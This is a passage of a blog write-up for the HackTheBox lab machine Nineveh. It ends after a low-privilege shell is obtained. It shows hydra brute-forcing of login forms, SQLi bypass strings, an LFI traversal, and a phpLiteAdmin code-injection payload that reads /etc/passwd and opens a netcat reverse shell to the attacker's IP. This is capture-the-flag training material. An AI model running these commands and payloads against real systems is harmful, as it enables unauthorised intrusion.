<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Nineveh" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine begins w/ a web enumeration, discovering a login page on both TCP/80 (HTTP) &amp; TCP/443 (HTTPS) that is both susceptible to a bruteforce attack due to a weak password and the lack of bruteforce prevention." /><meta property="og:description" content="Overview This machine begins w/ a web enumeration, discovering a login page on both TCP/80 (HTTP) &amp; TCP/443 (HTTPS) that is both susceptible to a bruteforce attack due to a weak password and the lack of bruteforce prevention." /><link rel="canonical" href="https://yufongg.github.io/posts/Nineveh/" /><meta property="og:url" content="https://yufongg.github.io/posts/Nineveh/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-24T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Nineveh" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-08-24T00:00:00+08:00","description":"Overview This machine begins w/ a web enumeration, discovering a login page on both TCP/80 (HTTP) &amp; TCP/443 (HTTPS) that is both susceptible to a bruteforce attack due to a weak password and the lack of bruteforce prevention.","headline":"HackTheBox - Nineveh","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Nineveh/"},"url":"https://yufongg.github.io/posts/Nineveh/"}</script><title>HackTheBox - Nineveh | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Nineveh</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220823232552.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Nineveh</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1661270400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-08-24 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1634 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ a web enumeration, discovering a login page on both TCP/80 (HTTP) &amp; TCP/443 (HTTPS) that is both susceptible to a bruteforce attack due to a weak password and the lack of bruteforce prevention.</p><p>On TCP/443, <code class="language-plaintext highlighter-rouge">phpLiteAdmin 1.9</code> is running, it is susceptible to a RCE exploit, an attacker is able to create a database w/ a <code class="language-plaintext highlighter-rouge">.php</code> file extension and a insert a PHP reverse shell into the values of the table. Also, after directory enumeration, a directory containing an image is discovered, after analyzing the image, SSH private key is embedded into the image.</p><p>On TCP/80 there is a limited LFI vulnerability, combined w/ the exploit on TCP/443 (HTTPS) we are able to include the PHP reverse shell, obtaining a low-privilege/<code class="language-plaintext highlighter-rouge">www-data</code> shell.</p><p>For privilege escalation we have to escalate our privileges twice, once to <code class="language-plaintext highlighter-rouge">Amorois</code> and to <code class="language-plaintext highlighter-rouge">root</code>. To privilege escalate to <code class="language-plaintext highlighter-rouge">Amrois</code>, use the SSH key found from the image. There are 2 ways to obtain <code class="language-plaintext highlighter-rouge">root</code>, <code class="language-plaintext highlighter-rouge">chkrootkit</code> &amp; <code class="language-plaintext highlighter-rouge">Polkit</code></p><p>If you wish to practice the same/similar LFI try Vulnhub Zico2.</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Nineveh<tr><td>IP<td>10.10.10.43<tr><td>Points<td>-<tr><td>Difficulty<td>Medium<tr><td>Creator<td><a href="https://www.hackthebox.com/home/machines/profile/54">Yas3r</a><tr><td>Release Date<td>04-Aug-2017</table></div><h1 id="recon">Recon</h1><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ffuf---directory-23-mediumtxt">FFUF - directory-2.3-medium.txt <a href="#ffuf---directory-23-mediumtxt" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/htb/nineveh]
└─# ffuf -u http://nineveh.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

200      GET        5l       25w      178c http://10.10.10.43/index.html
200      GET      977l     5005w        0c http://10.10.10.43/info.php
301      GET        9l       28w      315c http://10.10.10.43/department =&gt; http://10.10.10.43/department/
403      GET       11l       32w      299c http://10.10.10.43/server-status
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">department</code></ul><h2 id="tcp443-https">TCP/443 (HTTPS) <a href="#tcp443-https" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ffuf---directory-23-mediumtxt-1">FFUF - directory-2.3-medium.txt <a href="#ffuf---directory-23-mediumtxt-1" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>200      GET        1l        3w       49c https://10.10.10.43/index.html
301      GET        9l       28w      309c https://10.10.10.43/db =&gt; https://10.10.10.43/db/
403      GET       11l       32w      300c https://10.10.10.43/server-status
301      GET        9l       28w      319c https://10.10.10.43/secure_notes =&gt; https://10.10.10.43/secure_notes/
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">secure_notes</code><li><code class="language-plaintext highlighter-rouge">db</code></ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp80-http---bruteforce-login">TCP/80 (HTTP) - Bruteforce Login <a href="#tcp80-http---bruteforce-login" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Proceed to <code class="language-plaintext highlighter-rouge">http://nineveh.htb/department</code>, there is a login page<li>Attempt SQLi Auth Bypass, failed!<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> # Payload
 ' OR 1=1#
 ' OR 1=1 -- -
</pre></table></code></div></div><li>Attempt default creds, noticed something interesting<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> # Default Creds
 admin:admin
 admin:password
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220823235518.png" alt="" data-proofer-ignore></p><ul><li>It tells us that the password is invalid, meaning the username <code class="language-plaintext highlighter-rouge">admin</code> is valid</ul><li>Bruteforce w/ <code class="language-plaintext highlighter-rouge">hydra</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/nineveh]
 └─# hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password!"  -VI
 ...
 [80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">admin:1q2w3e4r5t</code></ul><li>Login w/ <code class="language-plaintext highlighter-rouge">admin:1q2w3e4r5t</code></ol><h2 id="tcp80-http---lfi">TCP/80 (HTTP) - LFI <a href="#tcp80-http---lfi" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Found a potential LFI vulnerability<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> /manage.php?notes=files/ninevehNotes.txt
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824015936.png" alt="" data-proofer-ignore></p><ul><li><code class="language-plaintext highlighter-rouge">check your secret folder to get in! figure it out!</code> - some sort of hint?</ul><li>Tried to directory enumerate <code class="language-plaintext highlighter-rouge">/department/FUZZ</code>, nothing found<li>I tried to enumerate it w/ a local file inclusion wordlist but it failed, there is probably some sort of input sanitization/checks.<li>To verify that <code class="language-plaintext highlighter-rouge">../</code> is not sanitized, I tried to go back a directory <code class="language-plaintext highlighter-rouge">../</code> and include <code class="language-plaintext highlighter-rouge">ninevehNotes.txt</code>, it worked!<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> # Current Dir
 /var/www/html/department

 # ninevehNotes.txt location
 /var/www/html/department/files/ninevehNotes.txt

 # Payload
 /manage.php?notes=../department/files/ninevehNotes.txt

 1. ../               : goes back 1 dir        = /var/www/html
 2. /department/files : cd into department dir = /var/www/html/department/files
 3. ninevehNotes.txt  : the file we want
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824020429.png" alt="" data-proofer-ignore></p><ul><li>Conclusion<ul><li><code class="language-plaintext highlighter-rouge">../</code> - not sanitized/filtered</ul></ul><li>Next, I try to exclude the file extension (<code class="language-plaintext highlighter-rouge">.txt</code>), an error is triggered<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> /manage.php?notes=../department/files/ninevehNotes
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824020629.png" alt="" data-proofer-ignore></p><ul><li><code class="language-plaintext highlighter-rouge">ninvehNotes - No such file or directory</code></ul><li>However, if i try to include a file that I know exists (<code class="language-plaintext highlighter-rouge">index.html</code>, <code class="language-plaintext highlighter-rouge">nineveh.png</code>) it does not work, there is no output <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824021403.png" alt="" data-proofer-ignore><ul><li>2 Conclusions<ul><li>Only <code class="language-plaintext highlighter-rouge">.txt</code> files will be shown/reflected<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>  # Hypothesis
  $path_parts = pathinfo('$_GET["notes"]');
			
  if $path_parts['extension'] = "txt"
      include $_GET["notes"]
</pre></table></code></div></div><li>Only filename that contains <code class="language-plaintext highlighter-rouge">ninevehNotes</code> will be shown<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>  # Hypothesis
  $path_parts = pathinfo('$_GET["notes"]');
			
  if $path_parts['filename'] = "ninevehNotes"
      include $_GET["notes"]
</pre></table></code></div></div></ul></ul><li>I tried to include <code class="language-plaintext highlighter-rouge">ninevehNotes.html</code> to see if an error is triggered, <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824022405.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">ninevehNotes.html - No such file or directory</code><li>Conclusion<ul><li>The file that we want to include is processed only if it is named <code class="language-plaintext highlighter-rouge">ninevehNotes.&lt;ext&gt;</code></ul><li>Since this is the case, we are not able to do LFI2RCE, move on to TCP/443 (HTTPS)</ul></ol><h2 id="tcp443---image-forensics">TCP/443 - Image Forensics <a href="#tcp443---image-forensics" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Proceed to <code class="language-plaintext highlighter-rouge">/secure_notes</code>, there is an image displayed<li>Tried to directory enumerate <code class="language-plaintext highlighter-rouge">/secure_notes/FUZZ</code>, nothing found<li>Download the image <code class="language-plaintext highlighter-rouge">nineveh.png</code><li>Check for comments w/ <code class="language-plaintext highlighter-rouge">exiftool</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/nineveh]
 └─# exiftool nineveh.png 
 ExifTool Version Number         : 12.39
 File Name                       : nineveh.png
 Directory                       : .
 File Size                       : 2.8 MiB
 File Modification Date/Time     : 2022:08:24 01:40:57+08:00
 File Access Date/Time           : 2022:08:24 01:40:56+08:00
 File Inode Change Date/Time     : 2022:08:24 01:40:57+08:00
 File Permissions                : -rw-r--r--
 File Type                       : PNG
 File Type Extension             : png
 MIME Type                       : image/png
 Image Width                     : 1497
 Image Height                    : 746
 Bit Depth                       : 8
 Color Type                      : RGB
 Compression                     : Deflate/Inflate
 Filter                          : Adaptive
 Interlace                       : Noninterlaced
 Significant Bits                : 8 8 8
 Software                        : Shutter
 Warning                         : [minor] Trailer data after PNG IEND chunk
 Image Size                      : 1497x746
 Megapixels                      : 1.1
</pre></table></code></div></div><ul><li>No comments</ul><li>Check if there are any files embeded in the image w/ <code class="language-plaintext highlighter-rouge">binwalk</code>, there is!<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/nineveh]
 └─# binwalk -eM --run-as=root nineveh.png 
	
 Scan Time:     2022-08-24 01:41:19
 Target File:   /root/htb/nineveh/nineveh.png
 MD5 Checksum:  353b8f5a4578e4472c686b6e1f15c808
 Signatures:    411
	
 DECIMAL       HEXADECIMAL     DESCRIPTION
 ------------------------------------------------------------------------------
 0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
 84            0x54            Zlib compressed data, best compression
 2881744       0x2BF8D0        POSIX tar archive (GNU)
	
	
 Scan Time:     2022-08-24 01:41:20
 Target File:   /root/htb/nineveh/_nineveh.png.extracted/54
 MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e
 Signatures:    411
	
 DECIMAL       HEXADECIMAL     DESCRIPTION
 ------------------------------------------------------------------------------
	
	
 Scan Time:     2022-08-24 01:41:20
 Target File:   /root/htb/nineveh/_nineveh.png.extracted/secret/nineveh.priv
 MD5 Checksum:  f426d661f94b16292efc810ebb7ea305
 Signatures:    411
	
 DECIMAL       HEXADECIMAL     DESCRIPTION
 ------------------------------------------------------------------------------
 0             0x0             PEM RSA private key
	
	
 Scan Time:     2022-08-24 01:41:20
 Target File:   /root/htb/nineveh/_nineveh.png.extracted/secret/nineveh.pub
 MD5 Checksum:  6b60618d207ad97e76664174e805cfda
 Signatures:    411
	
 DECIMAL       HEXADECIMAL     DESCRIPTION
 ------------------------------------------------------------------------------
 0             0x0             OpenSSH RSA public key
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">secret</code> directory<ul><li>This is probably what the note is refering to<li>Contains SSH private key, however TCP/22 (SSH) is not up, we might be able to use it later.</ul></ul></ol><h2 id="tcp443-https---phpliteadmin-v19-rce">TCP/443 (HTTPS) - phpLiteAdmin v1.9 RCE <a href="#tcp443-https---phpliteadmin-v19-rce" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Proceed to <code class="language-plaintext highlighter-rouge">db</code> we see <code class="language-plaintext highlighter-rouge">phpLiteAdmin v1.9</code>, the moment I saw this, I knew by combining the LFI exploit and <code class="language-plaintext highlighter-rouge">phpLiteAdmin v1.9</code> exploit, we can obtain a low-privilege shell.<ul><li>Vulnhub Zico2 - InitialFoothold has the same exploit!</ul><li>Bruteforce w/ <code class="language-plaintext highlighter-rouge">hydra</code> again<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/nineveh]
 └─# hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip https-post-form "/db/index.php :password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password."  -VI
	
 [443][http-post-form] host: 10.10.10.43   login: admin   password: password123
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">admin:password123</code></ul><li><p>Search exploits for <code class="language-plaintext highlighter-rouge">phpLiteAdmin</code></p><div class="table-wrapper"><table><thead><tr><th>Exploit Title<th>Path<tbody><tr><td>PHPLiteAdmin 1.9.3 - Remote PHP Code Injection<td>php/webapps/24044.txt</table></div><li>Try <code class="language-plaintext highlighter-rouge">php/webapps/24044.txt</code><ol><li>How does the exploit work?<ul><li>An attacker is able to create a Database w/ a php extension and insert PHP code as text fields in the Database, by accessing the file, PHP code is executed.</ul><li>Create a new database called <code class="language-plaintext highlighter-rouge">ninevehNotes.php</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824025746.png" alt="" data-proofer-ignore><ul><li>Only files that are named <code class="language-plaintext highlighter-rouge">ninevehNotes.&lt;any ext&gt;</code> will be processed</ul><li>Create table called <code class="language-plaintext highlighter-rouge">RCE</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824025903.png" alt="" data-proofer-ignore><li>Add field <code class="language-plaintext highlighter-rouge">name</code> w/ a default value of a PHP Code to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> Default Value
 &lt;?php system("cat /etc/passwd");?&gt;
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824030125.png" alt="" data-proofer-ignore></p><li>View location of database <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824030623.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">/var/tmp/ninevehNotes.php</code></ul><li>We will head back to the LFI exploit</ol></ol><h2 id="tcp80-http---lfi2rce">TCP/80 (HTTP) - LFI2RCE <a href="#tcp80-http---lfi2rce" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Include <code class="language-plaintext highlighter-rouge">/var/tmp/ninevehNotes.php</code>, it works!<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> # Current Dir
 /var/www/html/department
	
 # ninevehNotes.php location
 /var/tmp/ninevehNotes.php
	
 # Payload
 /manage.php?notes=../../../tmp/ninevehNotes.php
	
 1. ../../../         : goes back 3 dir        = /var
 2. /tmp/files        : cd into /tmp           = /var/tmp/
 3. ninevehNotes.php  : the file we want      
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824031110.png" alt="" data-proofer-ignore></p><li>Create another table called <code class="language-plaintext highlighter-rouge">RCE2</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824031413.png" alt="" data-proofer-ignore><li>Add field <code class="language-plaintext highlighter-rouge">name</code> w/ a default value of a PHP Code to invoke a reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> &lt;?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.31 4444 &gt;/tmp/f");?&gt;
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824031407.png" alt="" data-proofer-ignore></p><li>Start listener<li>Execute reverse shell by including <code class="language-plaintext highlighter-rouge">ninevehNotes.php</code><li>Shell obtained <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Nineveh/images/Pasted%20image%2020220824031551.png" alt="" data-proofer-ignore><li>Obtain a more stable shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@nineveh:/home/amrois$ 	
